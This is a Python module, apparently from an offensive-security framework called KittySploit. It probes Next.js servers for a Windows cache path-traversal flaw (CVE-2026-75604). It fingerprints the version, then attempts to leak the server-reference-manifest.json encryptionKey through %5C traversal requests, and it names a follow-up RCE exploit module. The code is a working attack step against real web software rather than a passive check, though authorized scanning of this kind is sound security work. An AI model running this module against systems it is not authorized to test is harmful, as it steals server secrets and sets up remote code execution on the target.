#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Next.js Windows cache traversal / manifest leak (CVE-2026-75604)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.nextjs_cve_2026_75604 import (
    leak_manifest,
    looks_like_nextjs,
    make_traversal,
    origin_from_base,
    parse_build_id,
)
from lib.scanner.http.nextjs_probe import extract_nextjs_version, nextjs_version_tuple


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Next.js CVE-2026-75604 Windows RCE detect",
        "description": (
            "Attempts to leak server-reference-manifest.json encryptionKey via "
            "%5C cache path traversal (Windows-hosted Next.js 13.4–15.5.23 / 16.x)."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-75604"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-75604",
            "https://github.com/advisories/GHSA-p293-qw3h-jr36",
        ],
        "tags": ["nextjs", "windows", "path-traversal", "cve-2026-75604"],
        "agent": {
            "chain": {
                "suggested_followups": ["exploits/windows/http/nextjs_cve_2026_75604_windows_rce"],
            },
        },
    }

    app_router = OptString("/", "Dynamic App Router cache path", False)
    pages_router = OptString("/", "Dynamic Pages ISR path", False)

    def _base_path(self) -> str:
        return (self.path or "/").rstrip("/") or ""

    def _origin(self) -> str:
        scheme = "https" if bool(getattr(self, "ssl", False)) else "http"
        host = str(getattr(self, "target", "") or getattr(self, "rhost", "") or "")
        port = int(getattr(self, "port", 80) or 80)
        if (scheme == "http" and port == 80) or (scheme == "https" and port == 443):
            return f"{scheme}://{host}"
        return f"{scheme}://{host}:{port}"

    def run(self):
        home = self.http_request(method="GET", path=self._base_path() or "/", allow_redirects=True)
        if not looks_like_nextjs(home):
            return False
        version = extract_nextjs_version(home) if home else ""
        vt = nextjs_version_tuple(version) if version else ()
        if vt and not (
            (vt >= (13, 4, 0) and vt < (15, 5, 24)) or (vt >= (16, 0, 0) and vt < (16, 3, 3))
        ):
            return False
        build_id = parse_build_id((home.text or "") if home else "")
        if not build_id:
            probe = self.http_request(
                method="GET",
                path=make_traversal(self._base_path(), self.app_router or "/", "probe"),
                headers={"Origin": self._origin()},
            )
            build_id = parse_build_id((probe.text or "") if probe else "")
        if not build_id:
            self.set_info(severity="medium", reason="Next.js without build id — set app/pages paths")
            return True

        def _get(path, headers=None):
            return self.http_request(method="GET", path=path, headers=headers or {})

        manifest = leak_manifest(
            lambda p, headers=None: _get(p, headers),
            self._base_path(),
            build_id,
            self.app_router or "/",
            self.pages_router or "/",
            self._origin(),
        )
        if manifest and manifest.get("encryptionKey"):
            self.set_info(
                severity="critical",
                cve="CVE-2026-75604",
                reason="server-reference-manifest encryptionKey leaked",
                version=version,
            )
            return True
        self.set_info(severity="high", reason="Next.js manifest leak not confirmed", version=version)
        return True